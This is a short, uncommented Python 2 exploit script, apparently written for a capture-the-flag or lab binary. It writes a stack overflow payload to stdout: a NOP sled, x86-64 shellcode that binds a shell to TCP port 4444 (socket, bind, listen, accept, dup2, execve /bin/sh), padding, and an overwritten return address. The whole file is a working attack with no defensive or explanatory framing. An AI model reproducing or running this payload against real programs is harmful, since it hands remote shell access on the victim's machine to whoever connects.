import sys

raw_input()
sys.stdout.write("3"+"\n"+"\x90"*113+"\xb8\x29\x00\x00\x00\x99\xbf\x02\x00\x00\x00\xbe\x01\x00\x00\x00\x0f\x05\x50\x5f\x52\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x11\x5c\x48\x89\xe6\x52\xba\x10\x00\x00\x00\xb8\x31\x00\x00\x00\x0f\x05\x5e\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x48\x89\xc7\xbe\x03\x00\x00\x00\xff\xce\xb0\x21\x0f\x05\x75\xf8\x48\x89\xf2\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05"+"\x90"*8+"\x00"*16+"\xe8\xec\xff\xff\xff\x7f\x00\x00"+"\n")

sys.stdout.flush()
